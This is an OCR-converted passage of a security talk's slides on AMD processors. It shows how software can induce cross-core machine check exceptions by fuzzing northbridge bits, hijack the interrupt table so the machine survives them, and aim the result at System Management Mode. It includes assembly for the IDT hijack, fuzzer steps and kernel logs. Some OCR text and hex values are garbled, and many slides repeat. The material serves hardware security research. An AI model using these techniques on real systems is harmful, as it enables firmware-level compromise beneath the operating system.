Attempt Error" "Replay Timeout Error" "Replay Attempt Error" "Replay Underflow Error" "Replay Overflow Error" "Packet Type Error" "Rx FIFO Error" "Deskew Error" "Rx Detect Timeout Error" "Data Parity Error" "Data Loss Error" "Lcu Error" "HB1 Handshake Timeout Error" "HB2 Handshake Timeout Error" "Clk Sleep Rsp Timeout Error" "Clk Wake Rsp Timeout Error" "Reset Attack Error" "Remote Link Fatal Error" "Data Loss Error" "Training Error" "Replay Parity Error" "Rx Fifo Underflow Error" "Rx Fifo Overflow Error" "CRC Error" "BER Exceeded Error" "Tx Fifo Underflow Error" "Replay Buffer Parity Error" "Tx Overflow Error" "Replay Fifo Overflow Error" "Replay Fifo Underflow Error" "Elastic Fifo Overflow Error" "Deskew Error" "Offline Error" "Data Startup Limit Error" "FC Init

## Slide 71

⊷Need to start somewhere.

⊷Some platforms reserve MC4 register bank for logging errors from the northbridge ⊷NB seems more configurable than others ⊸ vs. DC, IC, BU, FR, etc. ⊷Start there, expand later ⊷Details vary across generations

52740_16h_Models_30h-3Fh_BKDG.pdf

generating MCEs

## Slide 72

⊷Datasheets suggest MCEs can be generated from Master Abort signals arriving from NB

52740_16h_Models_30h-3Fh_BKDG.pdf

generating MCEs


> Recovered by OCR — confidence 92/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
-~Latasheets suggest MCEs can be generated
from Master Abort signals arriving from NB
Table 232: MC4 Error Descriptions
Link-defined sync error p: detected on link. The NB SyncePktEn
floods its outgoing link:
packets after detecting a sync packet on an incoming link
independent of the state of the control bits.
Master Abort |Master abort seen as result of link operation. Reasons for this |MstrAbortEn
error include requests to non-existent addresses. The NB
returns an error r se back to the requestor with any
ciated data all 1s independent of the state of the control bit.
Target Abort _ |Target abort seen as result of link operation. The NB returns an |TgtAbortEn
error response back to the requestor with any associated data
all 1s independent of the state of the control bit.
generating MCES
```

## Slide 73

## ⊷Master abort

⊸ Device initiating PCI request terminates transaction because target device failed to respond ⊸ Something we can control

⊷Easy! Access a non-existent PCI device: sudo setpci -A linux-sysfs -s 0:1f.0 0.L ⊷Nothing.

generating MCEs

## Slide 74

⊷But datasheets suggest there is some way for a master abort to cause an MCE ⊷Dive into the northbridge configuration

generating MCEs

## Slide 75

## ⊷Bits of interest in B/D/F 0/18/3:

|0:18.3 0x180[3]:
ChgDatErrToTgtAbort|0:18.3 0x40[9]:
TgtAbortEn|0:18.3 0x44[28]:
DisTgtAbortCpuErrRsp|
|---|---|---|
|0:18.3 0x180[5]:
DisPciCfgCpuMstAbortRsp|0:18.3 0x44[1]:
CpuRdDatErrEn|0:18.3 0x44[2]:
SyncFloodOnDramUcEcc|
|0:18.3 0x180[6]:
SyncFloodOnDatErr|0:18.3 0x44[20]:
SyncFloodOnWDT|0:18.3 0x44[3]:
SyncPktGenDis|
|0:18.3 0x180[7]:
SyncFloodOnTgtAbortErr|0:18.3 0x44[21]:
SyncFloodOnAnyUcErr|0:18.3 0x44[4]:
SyncPktPropDis|
|0:18.3 0x40[12]:
WDTRptEn|0:18.3 0x44[24]:
IoRdDatErrEn|0:18.3 0x44[5]:
IoMstAbortDis|
|0:18.3 0x40[31]:
McaCpuDatErrEn|0:18.3 0x44[25]:
DisPciCfgCpuErrRsp|0:18.3 0x44[6]:
CpuErrDis|
|0:18.3 0x40[5]:
SyncPktEn|0:18.3 0x44[26]:
FlagMcaCorrErr|0:18.3 0x44[7]:
IoErrDis|
|0:18.3 0x40[8]:
MstrAbortEn|0:18.3 0x44[27]:
NbMcaToMstCpuEn|0:18.3 0x44[8]:
WDTDis|

# generating MCEs

## Slide 76

⊷No single bit gives the desired behavior

⊷Many configurations crash or hang

⊷Too many permutations, not enough information

generating MCEs

## Slide 77

⊷A northbridge fuzzer

⊸ Specify the bits of interest (~24 plausible config bits identified)

⊸ Randomly flip a bit

⊸ If crash/hang:

⊶ Power cycle and try again

⊸ Access a non-existent device in the PCI space ⊸ Check MCA status registers for MCE logged

⊶ If platform resets,

MCA status registers are sticky, check on boot

⊸ Repeat

generating MCEs

## Slide 78

(demo)

generating MCEs

## Slide 79

generating MCEs

## Slide 80

generating MCEs


> Recovered by OCR — confidence 86/100 on the text kept, 73/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
. 302307]
. 302384]
. 302656]
. 303383]
. 303436]
. 308865]
. 328228]
. 336069]
: New USB device strings: MEr=0, Product=@, SerialNumber=0 —
: New USB device found, idVendor=0438, idProduct=7900, bcdDevice= 0.18
usb 1-1
hub 1-1:1.@: USB hub found
hub 1-1:1.0: 4 ports detected
usb 2-1
usb 2-1: New USB device strings: Mfr=@, Product=0, SerialNumber=0
hub 2-1:1.@: USB hub found
hub 2-1:1.0: 4 ports detected
Freeing initrd memory: 85444K
Segment Routing with IPv6
In-situ OAM (IOAM) with IPv6
NET: Registered PF_PACKET protocol family
Key type dns_resolver registered
x86/pm: family @x16 cpu detected, MSR saving is needed during suspending.
microcode: CPU@: patch_level=0x07030105
microcode: CPU1: patch_level=0x07030105
microcode: CPU2: patch_level=0x07030105
microcode: CPU3: patch_level=0x07030105
microcode: Microcode Update Driver: v2.2.
IPI shorthand broadcast: enabled
mce: [Hardware Error]: Machine check events logged
registered taskstats version 1
mce: [Hardware Error]: CPU 1: Machine Check: @ Bank @: b60000000000083b
mce: [Hardware Error]: TSC @ ADDR fdfc000
cfc
mce: [Hardware Error]: PROCESSOR 2:730f01 TIME 1753409480 SOCKET @ APIC 1 microcode 7030105
Loading compiled-in X.509 certificates
Loaded X.5@9 cert ‘Build time qutogenerated kernel key: d5862910adca7ee16194da1e1a805db529424367'
Loaded X.509 cert ‘Canonical Ltd. Live Patch Signing: 14d£34d1087cf£37625abecO39ef2bf521249b969 '
Loaded X.5@9 cert ‘Canonical Ltd. Kernel Module Signing: 88£752e560a1e0737e31163a466ad7b70a850c19'
blacklist: Loading compiled-in revocation X.509 certificates
Loaded X.5@9 cert ‘Canonical Ltd. Secure
Loaded X.509 cert ‘Canonical Ltd. Secure
Loaded X.5@9 cert ‘Canonical Ltd. Secure
Loaded X.5@9 cert 'Canonical Ltd. Secure
Loaded X.509 cert ‘Canonical Ltd. Secure
Loaded X.5@9 cert ‘Canonical Ltd. Secure
Loaded X.509 cert ‘Canonical Ltd. Secure
Loaded X.5@9 cert ‘Canonical Ltd. Secure
zswap: loaded using pool 1zo/zbud
Key type .fscrypt registered
Key type fscrypt-provisioning registered
Key type trusted registered
Key type encrypted registered
Boot
Boot
Boot
Boot
Boot
Boot
Boot
Boot
Signing:
Signing
Signing
Signing
Signing
Signing
Signing
Signing
(2017): 242ade75ac4a15e50d50c84b0d45f f3eae707a03'
(ESM 2018): 365188c1d374d6b07c3c8f£240f8ef722433d6a8b'
(2019): c@746£d6c5da3ae827864651ad66ae47fe24b3e8'
(2021 v1): a8d54bbb3825cf£b94fa13c9f£8a594a195c107b8d'
(2021 v2): 4cf£046892d6£d3c9a5b03£98d845£90851dc6a8c '
(2021 v3): 100437bb6de6e469b581e61cd66bce3ef4ed53af '
(Ubuntu Core 2019): c1d57b8£6b743f£23ee41£4f7ee292f06eecadfb9'
```

## Slide 81

⊷Found a 2-bit northbridge combination that works ⊷But MCE delivered to core that generates the abort ⊷Not useful for core to target itself with an MCE

   - ⊸ Can only interrupt our own code this way

- ⊷We have a hammer, but we can only hit ourselves

⊷Need ability for one core to target different core

- generating cross core MCEs

## Slide 82

Let’s build a hammer… Let's add a handle…


> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Let’s build a hammer...
Let's add a handle...
```

## Slide 83

⊷Modify fuzzer

- ⊸ Search for more complex bit configurations

- ⊸ Generate PCI abort on from one core, check MCEs on others

- generating cross core MCEs

## Slide 84


> Recovered by OCR — confidence 80/100 on the text kept, 70/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
.235420]
.293539] Key type dns_resolver registered
- 293580] family 0x16 cpu detected, MSR saving is needed during suspending.
.294261]
.294314]
.297001]
.297012]
.299767] mce
.299871]
. 308733]
333134] Key type
-334719] Key type
. 336350] Ke
.351789] integrity: Loading X.509 certificate: UEFI:db
usb
hub
hub
usb
usb
hub
hub
: New
:1.0:
: New
: New
:1.0@: USB hub found
1.0: 4 ports detected
initrd memory: 85444K
Segment Routing with IPv6
In-situ OAM (IOAM) with IPv6
NET: Registered PF_PACKET protocol family
USB hub found
4 ports detected
2- 1:
x86/pm:
microcode: CPUQ@: patch_level=0x07030105
microcode: CPU1: patch_level=0x07030105
microcode: CPU2: patch_level=0x07030105
microcode: CPU3: patch_level=0x07030105
microcode: Microcode Update Driver: v2.2.
IPI shorthand broadcast: enabled
: [Hardware Error]: Machine check events lo
registered taskstats version 1
mce: [Hardware Error]: TSC @ ADDR fdfc00cfc
mce:
Loading compiled-in X.509 certificates
-fscrypt registered
fscrypt-provisioning registered
trusted registered
encrypted registered
AppArmor shal policy hashing enabled
y type
gged
USB device strings: Mfr=@, Product=@, SerialNumber=0
USB device found, idVendor=0438, idProduct=7900, bcdDevice= 0.18
USB device strings: Mfr=@, Product=@, SerialNumber=0
mce: [Hardware Error]: CPU @: Machine Check: @ Bank 4: b70000110003081b
[Hardware Error]: PROCESSOR 2:730£01 TIME 1753410695 SOCKET @ APIC @ microcode 7030105
Loaded X.509 cert 'Build time autogenerated kernel key: d586291@adca7ee16194da1e1a805db529424367'
311337] Loaded X.509 cert ‘Canonical Ltd. Live Patch Signing: 14d£34d1a87c£37625abecO39ef2b£521249b969'
. 313937] Loaded X.509 cert ‘Canonical Ltd. Kernel Module Signing: 88£752e560a1e0737e31163a466ad7b70a850c19'
- 315301] blacklist: Loading compiled-in revocation X.509 certificates
. 316739] Loaded X.509 cert ‘Canonical Ltd. Secure Boot Signing: 61482aa283@d@ab2ad5af10b7250da9033ddcefa'
. 318252] Loaded X.5@9 cert ‘Canonical Ltd. Secure Boot Signing (2017): 242ade75ac4a15e50d50c84b0d45f f3eae707a03'
. 319787] Loaded X.5@9 cert ‘Canonical Ltd. Secure Boot Signing (ESM 2018): 365188c1d374d6b07c3c8f240f8ef722433d6a8b'
. 321366] Loaded X.509 cert ‘Canonical Ltd. Secure Boot Signing (2019): c0746fd6c5da3ae827864651ad66ae47£e24b3e8 '
. 322941] Loaded X.509 cert ‘Canonical Ltd. Secure Boot Signing (2021 v1): a8d54bbb3825cfb94fa13c9£8a594a195c107b8d'
- 324520] Loaded X.509 cert ‘Canonical Ltd. Secure Boot Signing (2021 v2): 4cf£046892d6fd3c9a5b03£98d845£90851dc6a8c'
. 326093] Loaded X.509 cert ‘Canonical Ltd. Secure Boot Signing (2021 v3): 100437bb6de6e469b581e61cd66bce3ef4ed53af'
. 327659] Loaded X.5@9 cert ‘Canonical Ltd. Secure Boot Signing (Ubuntu Core 2019): c1d57b8£6b743f23ee41£4£7ee292f06eecad£b9'
. 331069] zswap: loaded using pool 1z0/zbud
```

## Slide 85

⊷Found 3-bit northbridge configuration where non-core-0 generates PCI abort, delivered as MCE on core-0 ⊷Issue: platform still resets

- generating cross core MCEs

## Slide 86

Let’s build a hammer… Let's add a handle… Let’s … be a bit more careful


> Recovered by OCR — confidence 92/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Let’s build a hammer...
Let's add a handle...
Let’s ... be a bit more careful
```

## Slide 87

⊷Interrupting core-0 from core-1 is not useful if the platform immediately resets ⊷Operating system is responsible for MCE handling ⊷Hijack CPU interrupt table to install first-pass MCE handler

staying alive

## Slide 88

push   %rax
push   %rdi
push   %rsi
OS IDT
push   %rdx
push   %rcx
…
push   %r8
push   %r9
push   %r10
ffffffffc0b2ed40
push   %r11
mov    $0x3,%rdi
ffffffffc0b2ed80 mov    $0xfe,%rsi
mov    0x48(%rsp),%rdx
CPU ffffffffc0b2edc0 mov    0x50(%rsp),%r10
callq  1180 <os_handler>
pop    %r11
ffffffffc0b2ee40
pop    %r10
pop    %r9
ffffffffc0b2ee80 pop    %r8
pop    %rcx
pop    %rdx
… pop    %rsi
pop    %rdi
pop    %rax
iretq

CPU

## Slide 89

Hijack IDT
…
ffffffffc0197d20
ffffffffc0197d60
CPU
ffffffffc0197da0
ffffffffc0197ee0
ffffffffc0197e20
…

push   %rax push   %rdi push   %rsi OS IDT push   %rdx push   %rcx … push   %r8 push   %r9 push   %r10 ffffffffc0b2ed40 push   %r11 mov    $0x3,%rdi ffffffffc0b2ed80 mov    $0xfe,%rsi mov    0x48(%rsp),%rdx ffffffffc0b2edc0 mov    0x50(%rsp),%r10 callq  1180 <os_handler> pop    %r11 ffffffffc0b2ee40 pop    %r10 pop    %r9 ffffffffc0b2ee80 pop    %r8 pop    %rcx pop    %rdx … pop    %rsi pop    %rdi pop    %rax iretq

## Slide 90

|Hijack IDT|pushf
push %%rax
push %%rdi
push %%rsi
push %%rdx|OS IDT|push
push
push
push
|%rax
%rdi
%rsi
%rdx
|
|---|---|---|---|---|
|…|push %%rcx
push %%r8
push %%r9|…|push
push
push|%rcx
%r8
%r9|
|ffffffffc0197d20|push %%r10
push %%r11|ffffffffc0b2ed40|push
push
|%r10
%r11
|
||mov %0, %%rdi||mov|$0x3,%rdi|
|ffffffffc0197d60|mov %1, %%rsi|ffffffffc0b2ed80|mov
|$0xfe,%rsi
|
|ffffffffc0197da0
CPU|mov 0x48(%%rsp), %%rdx
mov 0x50(%%rsp), %%r10
callhijack_handler|ffffffffc0b2edc0|mov
mov
callq
|0x48(%rsp),%rdx
0x50(%rsp),%r10
1180 <os_handler>
|
|ffffffffc0197ee0|pop %%r11
pop %%r10|ffffffffc0b2ee40|pop
pop
|%r11
%r10
|
||pop %%r9||pop|%r9|
|ffffffffc0197e20|pop %%r8
pop %%rcx|ffffffffc0b2ee80|pop
pop
|%r8
%rcx
|
|…|pop %%rdx
pop %%rsi
pop %%rdi
pop %%rax
addq $8, %%rsp
popf
jmp *%2|…|pop
pop
pop
pop
iretq|%rdx
%rsi
%rdi
%rax|

## Slide 91

⊷Modified handler indiscriminately clears any logged MCE from the MCA banks before handing control to OS handler ⊸ OS won’t reset the platform if it can’t see what caused the MCE ⊸ Dangerous, but good enough

staying alive

## Slide 92

(demo)

staying alive

## Slide 93


> Recovered by OCR — confidence 72/100 on the text kept, 66/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Every @.1s: cat /proc/interrupts | grep --color=always -e "“" -e "MCE.*" ubuntu-usb-3: Sat Aug 2 22:21:36 2025
CPU@ CPUL cPU2 CPU3
Q: 48 @ Q @ I0-APIC 2-edge timer
8: 1 ) @ @ I0-APIC 8-edge rtcd
9: @ @ ) @ I0-APIC 9-fasteoi acpi
16: 1) 422 ) @ IO-APIC 16-fasteoi snd_hda_intel:card1
25: Q @ Q Q@ PCI-MSI 34816-edge PCIe PME, pciehp
29: @ @ @ @ PCI-MSI 38912-edge PCIe PME, pciehp
32: @ @ @ Q@ PCI-MSI 43008-edge PCIe PME, pciehp
33; @ 327 10 @ PCI-MSI 278528-edge ahcil0000:00:11.0]
34: Q Q 32 @ PCI-MSI 262144-edge xhci_hed
38: Q Q Q @ PCI-MSI 262148-edge xhci_hed
46: ) ) 6 @ PCI-MSI 16384-edge radeon
LOC: 15297 14171 15864 18674 Local timer interrupts
IWI: 3944 3774 3989 3742 IRQ work interrupts
RTR: ) @ @ Q@ APIC ICR read retries
RES: 1177 1419 1500 1178 Rescheduling interrupts
CAL: 26427 19112 21529 15558 Function call interrupts
TLB: 208 146 152 179 TLB shootdowns
TRM: @ @ @ @ Thermal event interrupts
THR: @ @ @ @ Threshold APIC interrupts
DFR: Wy ) ) @ Deferred Error APIC interrupts
MCP : 1 1 1 1 Machine check polls
NPI: @ ) ) @ Nested posted-interrupt event
PIW: @ @ @ @ Posted-interrupt wakeup event
```

## Slide 94

⊷A state disruptor tool

⊷On-demand generation of hardware MCEs entirely from software

⊷Moving forward

⊸ We’ll use the NB approach for MCE generation ⊸ Configuration specifics will vary by platform

⊸ Many unexplored ways to generate MCEs

a state disruptor tool

## Slide 95

⊷What to target?

selecting a target

## Slide 96

Let’s build a hammer… Let's add a handle… Let’s be a bit more careful… Let’s find a nail…


> Recovered by OCR — confidence 77/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
_et’s build ahammer...
| et's add a handle...
| et’s be a bit more Careful...
| et’s find a nail...
```

## Slide 97

⊷Current MCE approach uses ring-0 for northbridge reconfiguration

- ⊷Select targets more privileged than ring-0

   - ⊸ (We’ll revisit this requirement)

   - ⊸ Game not over at ring-0 – gets much, much deeper

- ⊷Possible options:

   - ⊸ Hypervisors, secure guests, enclaves, secure loader, etc.

- ⊷ System Management Mode is an appealing target

# selecting a target

## Slide 98

- ⊷35 years old

- ⊷Invisible to operating system, hypervisor, etc.

- ⊷Can preempt operating system, hypervisor, etc.

- ⊷Ring -2

- ⊷Critical to platform security, server RAS, client miscellanea

- ⊷Firmware R/W access in many configurations

system management mode

## Slide 99

RAM

CPU

## Slide 100

RAM

CPU

MMIO

RAM

## Slide 101

RAM

CPU

SMRAM

SMBASE BF80_0000

MMIO

RAM

## Slide 102

mov si,0x8148 o32 lgdt [cs:si] mov eax,0x3 mov cr0,eax jmp short 0x14 mov ax,0x18 mov ss,ax mov eax,0x9ffe2ff8 mov esp,eax RAM o32 push byte +0x10 mov ecx,0xc0010111 rdmsr mov ebx,eax add eax,0x803a push eax retfd ... SMBASE push rax push rdx SMRAM and rax,~0x7ffffff BF80_0000 CPU wrmsr mov rcx,rsi mov rax,0x9fff492c add rsp,byte +0x20 MMIO mov rcx,0xc0010015 rdmsr test al,0x1 jnz 0x6d3 pop rdx pop rax mov rcx,0xc0010112 wrmsr RAM pop rdx pop rax mov rcx,0xc0010113 wrmsr rsm

## Slide 103

|CPU|
|---|

RAM SMBASE SMRAM BF80_0000 MMIO RAM

## Slide 104

I/O Device SMI CPU

RAM SMBASE SMRAM BF80_0000 MMIO RAM

## Slide 105

I/O
Device
microcode
RAM
SMI
SMBASE
SMRAM
BF80_0000
CPU
MMIO
RAM

## Slide 106

mov si,0x8148 o32 lgdt [cs:si] mov eax,0x3 mov cr0,eax jmp short 0x14 I/O mov ax,0x18 mov ss,ax Device mov eax,0x9ffe2ff8 microcode mov esp,eax RAM o32 push byte +0x10 open SMRAM mov ecx,0xc0010111 rdmsr mov ebx,eax SMI add eax,0x803a push eax retfd ... SMBASE push rax push rdx SMRAM and rax,~0x7ffffff BF80_0000 CPU wrmsr mov rcx,rsi mov rax,0x9fff492c add rsp,byte +0x20 MMIO mov rcx,0xc0010015 rdmsr test al,0x1 jnz 0x6d3 pop rdx pop rax mov rcx,0xc0010112 wrmsr RAM pop rdx pop rax mov rcx,0xc0010113 wrmsr rsm

## Slide 107

mov si,0x8148
o32 lgdt [cs:si]
mov eax,0x3
mov cr0,eax
jmp short 0x14
I/O  mov ax,0x18
mov ss,ax
Device mov eax,0x9ffe2ff8
microcode
mov esp,eax RAM
o32 push byte +0x10
open SMRAM mov ecx,0xc0010111
rdmsr
save CPU state mov ebx,eax
SMI
add eax,0x803a
push eax
retfd
...
SMBASE
push rax
push rdx SMRAM
and rax,~0x7ffffff BF80_0000
CPU wrmsr
mov rcx,rsi
mov rax,0x9fff492c
add rsp,byte +0x20 MMIO
mov rcx,0xc0010015
rdmsr
test al,0x1
jnz 0x6d3
pop rdx
pop rax
mov rcx,0xc0010112
wrmsr
RAM
pop rdx
pop rax
mov rcx,0xc0010113
wrmsr
rsm

## Slide 108

mov si,0x8148
o32 lgdt [cs:si]
mov eax,0x3
mov cr0,eax
jmp short 0x14
I/O  mov ax,0x18
mov ss,ax
Device mov eax,0x9ffe2ff8
microcode
mov esp,eax RAM
o32 push byte +0x10
open SMRAM mov ecx,0xc0010111
rdmsr
save CPU state mov ebx,eax
SMI
add eax,0x803a
load SMM state push eax
retfd
...
SMBASE
push rax
push rdx SMRAM
and rax,~0x7ffffff BF80_0000
CPU wrmsr
mov rcx,rsi
mov rax,0x9fff492c
add rsp,byte +0x20 MMIO
mov rcx,0xc0010015
rdmsr
test al,0x1
jnz 0x6d3
pop rdx
pop rax
mov rcx,0xc0010112
wrmsr
RAM
pop rdx
pop rax
mov rcx,0xc0010113
wrmsr
rsm

## Slide 109

mov si,0x8148
o32 lgdt [cs:si]
mov eax,0x3
mov cr0,eax
jmp short 0x14
I/O  mov ax,0x18
mov ss,ax
Device mov eax,0x9ffe2ff8
microcode
mov esp,eax RAM
o32 push byte +0x10
open SMRAM mov ecx,0xc0010111
rdmsr
save CPU state mov ebx,eax
SMI
add eax,0x803a
load SMM state push eax
retfd
...
jump to SMRAM SMBASE
push rax
push rdx SMRAM
and rax,~0x7ffffff BF80_0000
CPU wrmsr
mov rcx,rsi
mov rax,0x9fff492c
add rsp,byte +0x20 MMIO
mov rcx,0xc0010015
rdmsr
test al,0x1
jnz 0x6d3
pop rdx
pop rax
mov rcx,0xc0010112
wrmsr
RAM
pop rdx
pop rax
mov rcx,0xc0010113
wrmsr
rsm

## Slide 110

mov si,0x8148
o32 lgdt [cs:si]
mov eax,0x3
mov cr0,eax
jmp short 0x14
I/O  mov ax,0x18
mov ss,ax
Device mov eax,0x9ffe2ff8
microcode
mov esp,eax RAM
o32 push byte +0x10
open SMRAM mov ecx,0xc0010111
rdmsr
save CPU state mov ebx,eax
SMI
add eax,0x803a
load SMM state push eax
retfd
...
jump to SMRAM SMBASE
push rax
push rdx SMRAM
and rax,~0x7ffffff BF80_0000
CPU wrmsr
mov rcx,rsi
mov rax,0x9fff492c
add rsp,byte +0x20 MMIO
mov rcx,0xc0010015
rdmsr
test al,0x1
jnz 0x6d3
pop rdx
pop rax
mov rcx,0xc0010112
wrmsr
RAM
pop rdx
pop rax
mov rcx,0xc0010113
wrmsr
rsm

## Slide 111

mov si,0x8148
o32 lgdt [cs:si]
mov eax,0x3
mov cr0,eax
jmp short 0x14
I/O  mov ax,0x18
mov ss,ax
Device mov eax,0x9ffe2ff8
microcode
mov esp,eax RAM
o32 push byte +0x10
open SMRAM mov ecx,0xc0010111
rdmsr
save CPU state mov ebx,eax
SMI
add eax,0x803a
load SMM state push eax
retfd
...
jump to SMRAM SMBASE
push rax
push rdx SMRAM
and rax,~0x7ffffff BF80_0000
CPU wrmsr
mov rcx,rsi
mov rax,0x9fff492c
add rsp,byte +0x20 MMIO
mov rcx,0xc0010015
rdmsr
test al,0x1
jnz 0x6d3
pop rdx
pop rax
mov rcx,0xc0010112
wrmsr
RAM
pop rdx
pop rax
mov rcx,0xc0010113
wrmsr
rsm

## Slide 112

mov si,0x8148
o32 lgdt [cs:si]
mov eax,0x3
mov cr0,eax
jmp short 0x14
I/O  mov ax,0x18
mov ss,ax
Device mov eax,0x9ffe2ff8
microcode
mov esp,eax RAM
o32 push byte +0x10
open SMRAM mov ecx,0xc0010111
rdmsr
save CPU state mov ebx,eax
SMI
add eax,0x803a
load SMM state push eax
retfd
...
jump to SMRAM SMBASE
push rax
push rdx SMRAM
and rax,~0x7ffffff BF80_0000
CPU wrmsr
mov rcx,rsi
mov rax,0x9fff492c
add rsp,byte +0x20 MMIO
mov rcx,0xc0010015
rdmsr
test al,0x1
jnz 0x6d3
pop rdx
pop rax
mov rcx,0xc0010112
wrmsr
RAM
pop rdx
pop rax
mov rcx,0xc0010113
wrmsr
rsm

## Slide 113

mov si,0x8148
o32 lgdt [cs:si]
mov eax,0x3
mov cr0,eax
jmp short 0x14
I/O  mov ax,0x18
mov ss,ax
Device mov eax,0x9ffe2ff8
microcode
mov esp,eax RAM
o32 push byte +0x10
open SMRAM mov ecx,0xc0010111
rdmsr
save CPU state mov ebx,eax
SMI
add eax,0x803a
load SMM state push eax
retfd
...
jump to SMRAM SMBASE
push rax
push rdx SMRAM
and rax,~0x7ffffff BF80_0000
CPU wrmsr
microcode mov rcx,rsi
mov rax,0x9fff492c
add rsp,byte +0x20 MMIO
mov rcx,0xc0010015
rdmsr
test al,0x1
jnz 0x6d3
pop rdx
pop rax
mov rcx,0xc0010112
wrmsr
RAM
pop rdx
pop rax
mov rcx,0xc0010113
wrmsr
rsm

## Slide 114

mov si,0x8148
o32 lgdt [cs:si]
mov eax,0x3
mov cr0,eax
jmp short 0x14
I/O  mov ax,0x18
mov ss,ax
Device mov eax,0x9ffe2ff8
microcode
mov esp,eax RAM
o32 push byte +0x10
open SMRAM mov ecx,0xc0010111
rdmsr
save CPU state mov ebx,eax
SMI
add eax,0x803a
load SMM state push eax
retfd
...
jump to SMRAM SMBASE
push rax
push rdx SMRAM
and rax,~0x7ffffff BF80_0000
CPU wrmsr
microcode mov rcx,rsi
mov rax,0x9fff492c
add rsp,byte +0x20 MMIO
restore CPU state
mov rcx,0xc0010015
rdmsr
test al,0x1
jnz 0x6d3
pop rdx
pop rax
mov rcx,0xc0010112
wrmsr
RAM
pop rdx
pop rax
mov rcx,0xc0010113
wrmsr
rsm

## Slide 115

I/O
Device
microcode
RAM
open SMRAM
save CPU state
SMI
load SMM state
jump to SMRAM SMBASE
SMRAM
BF80_0000
CPU
microcode
MMIO
restore CPU state
close SMRAM
RAM

## Slide 116

I/O
Device
microcode
RAM
open SMRAM
save CPU state
SMI
load SMM state
jump to SMRAM SMBASE
SMRAM
BF80_0000
CPU
microcode
MMIO
restore CPU state
close SMRAM
jump to original
code
RAM

## Slide 117

(demo)

system management mode

## Slide 118

## Slide 119

⊷Compromising ring -2

⊸ SMM code running in SMRAM ⊸ Corrupt or hijack normal control flow to execute malicious payload

⊸ Unlock SMRAM

system management mode

## Slide 120

⊷CPU modes must share resources with differently privileged modes ⊸ CPU must reset processor context between modes ⊸ Not feasible to reset entire processor context

⊸ Architects carefully select which state to change

⊷Done correctly, event from less privileged mode should not impact more privileged mode

state sanitization

## Slide 121

⊷SMM transition on AMD processors ⊷Sanitize relevant CPU registers ⊷Suppress interrupts ⊸ NMI masked ⊸ INIT ignored ⊸ SMI masked ⊸ Maskable interrupts via IF in eflags ⊸ Debug interrupts/exception via DR7 ⊸ Traps via TF in eflags

# state sanitization

|CS|0000|
|---|---|
|DS|0000|
|ES|0000|
|FS|0000|
|GS|0000|
|SS|0000|
|GPRs|Unmodified|
|EFLAGS|0000_0002|
|RIP|0000_0000_0000_8000|
|CR0|PE, EM, TS, PG cleared|
|CR4|0000_0000_0000_0000|
|GDTR|Unmodified|
|LDTR|Unmodified|
|IDTR|Unmodified|
|TR|Unmodified|
|DR6|Unmodified|
|DR7|0000_0000_0000_0400|
|EFER|All cleared except SVME|

## Slide 122

⊷SMM transition on AMD processors ⊷Sanitize relevant CPU registers ⊷Suppress interrupts ⊸ NMI masked ⊸ INIT ignored ⊸ SMI masked ⊸ Maskable interrupts via IF in eflags ⊸ Debug interrupts/exception via DR7 ⊸ Traps via TF in eflags

# state sanitization

|CS|0000|
|---|---|
|DS|0000|
|ES|0000|
|FS|0000|
|GS|0000|
|SS|0000|
|GPRs|Unmodified|
|EFLAGS|0000_0002|
|RIP|0000_0000_0000_8000|
|CR0|PE, EM, TS, PG cleared|
|CR4|0000_0000_0000_0000|
|GDTR|Unmodified|
|LDTR|Unmodified|
|IDTR|Unmodified|
|TR|Unmodified|
|DR6|Unmodified|
|DR7|0000_0000_0000_0400|
|EFER|All cleared except SVME|

## Slide 123

⊷IDTR points to the Interrupt Descriptor Table (IDT)

⊷IDTR unmodified on entry to SMM

⊷Any interrupt or exception that does occur in SMM will be delivered on an untrusted handler ⊷Basically: `“ try { main() } except { pop_shell() } ”` ⊷Many ways to approach this

⊸ If anything goes wrong, it leads to privilege escalation

⊷One option: induce machine check on the untrusted IDT

state sanitization

## Slide 124

⊷Challenge: CR4 is cleared by microcode ⊸ MCE handling disabled (CPU resets on MCE)

state sanitization

|CS|0000|
|---|---|
|DS|0000|
|ES|0000|
|FS|0000|
|GS|0000|
|SS|0000|
|GPRs|Unmodified|
|EFLAGS|0000_0002|
|RIP|0000_0000_0000_8000|
|CR0|PE, EM, TS, PG cleared|
|CR4|0000_0000_0000_0000|
|GDTR|Unmodified|
|LDTR|Unmodified|
|IDTR|Unmodified|
|TR|Unmodified|
|DR6|Unmodified|
|DR7|0000_0000_0000_0400|
|EFER|All cleared except SVME|

## Slide 125

BITS 16 ASM_PFX(gcSmiHandlerTemplate):

BITS 64 ProtFlatMode:

BITS 16 BITS 64 sub  esp, 4 @LongMode: ASM_PFX(gcSmiHandlerTemplate): ProtFlatMode: xor  rdx, rdx mov  rax, strict qword 0 _SmiEntryPoint: mov  eax, strict dword 0 push rdx SmiHandlerIdtrAbsAddr: mov  bx, _GdtDesc-_SmiEntryPoint+0x8000 ASM_PFX(gPatchSmiCr3): jmp  EnableNxe lidt [rax] mov  ax,[cs:DSC_OFFSET+DSC_GDTSIZ] mov  cr3, rax lea  ebx, [rdi+DSC_OFFSET] dec  ax mov  eax, 0x668 MsrIa32MiscEnableSupported: mov  ax, [rbx+DSC_DS] mov  [cs:bx], ax mov  ecx, MSR_IA32_MISC_ENABLE mov  ds, eax mov  eax, [cs:DSC_OFFSET+DSC_GDTPTR] mov  cl, strict byte 0 rdmsr mov  ax, [rbx+DSC_OTHERSEG] mov  [cs:bx+2], eax ASM_PFX(gPatch5LevelPagingNeeded): sub  esp, 4 mov  es, eax o32 lgdt  [cs:bx] cmp  cl, 0 push rdx mov  fs, eax mov  ax, PROTECT_MODE_CS je   SkipEnable5LevelPaging test edx, BIT2 mov  gs, eax mov  [cs:bx-0x2],ax jz   EnableNxe mov  ax, [rbx+DSC_SS] mov  edi, strict dword 0 